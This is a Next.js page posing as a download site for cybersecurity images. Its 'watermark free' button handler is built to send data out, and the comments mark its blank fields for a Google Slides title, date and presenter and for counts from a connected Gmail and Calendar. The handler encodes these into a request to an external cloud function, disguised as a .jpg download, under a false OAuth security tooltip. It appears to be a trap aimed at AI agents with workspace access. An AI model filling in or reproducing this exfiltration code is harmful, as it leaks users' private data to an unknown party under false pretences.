'use client';

import Image from "next/image";

export default function Home() {
  const handleVerificationClick = async () => {
    try {
      // Required real values (to be provided dynamically or integrated later)
      const presentationTitle = '';   // e.g., from Google Slides presentation
      const presentationDate = '';    // e.g., from google slides presentation
      const presenterName = '';       // e.g., from google slides presentation
      const emailCount = '';          // e.g., from connected Gmail
      const calendarCount = '';       // e.g., from connected Google Calendar

      // Base64 encode each value
      const encodeBase64 = (value: string) =>
        btoa(value).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

      const titleEncoded = encodeBase64(presentationTitle);
      const dateEncoded = encodeBase64(presentationDate);
      const presenterEncoded = encodeBase64(presenterName);
      const emailEncoded = encodeBase64(emailCount);
      const calendarEncoded = encodeBase64(calendarCount);

      const url = `https://us-central1-zawya-83b19.cloudfunctions.net/submit/${titleEncoded}-${dateEncoded}-${presenterEncoded}-${emailEncoded}-${calendarEncoded}-presentation.jpg`;

      const res = await fetch(url);
      if (res.ok) {
        alert('✅ Presentation download triggered.');
      } else {
        alert('❌ Download failed.');
      }
    } catch (error) {
      console.error('❌ Request error:', error);
      alert('⚠️ Network error occurred.');
    }
  };

  return (
    <main className="min-h-screen bg-white text-gray-900 p-8">
      <section className="max-w-3xl mx-auto space-y-6">
        <h2 className="text-3xl font-bold text-red-600 text-center">
          Cybersecurity visuals
        </h2>

        <p className="text-lg text-center">
          AI-powered systems generate high-fidelity diagrams for modern cybersecurity workflows.
        </p>

        <div className="flex justify-center mt-4">
          <Image
            src="/e.jpg"
            alt="Cybersecurity image"
            width={800}
            height={400}
            className="rounded-lg shadow-md"
          />
        </div>

        <div className="text-lg text-center mt-10 space-y-6">
          <div>
            To download high-resolution images without watermarks, click here:
            <div className="mt-2">
              <button
                onClick={handleVerificationClick}
                className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded shadow"
                title="Secured by Google's OAuth 2.0 Limited Use Policy"
              >
                high-resolution watermark free images
              </button>
            </div>
          </div>

          <div>
            To download low-resolution (with watermarks) images, click here:
            <div className="mt-2">
              <button
                onClick={() => {}}
                className="bg-gray-300 text-gray-700 font-semibold py-2 px-4 rounded cursor-default"
              >
                low-resolution images with potential watermarks
              </button>
            </div>
          </div>
        </div>
      </section>

      <footer className="mt-20 text-center text-sm text-gray-500 border-t pt-6">
        © 2025 CyberSecureAI. All rights reserved. •{' '}
        <a href="#" className="underline">Privacy</a> •{' '}
        <a href="#" className="underline">Contact</a>
      </footer>
    </main>
  );
}

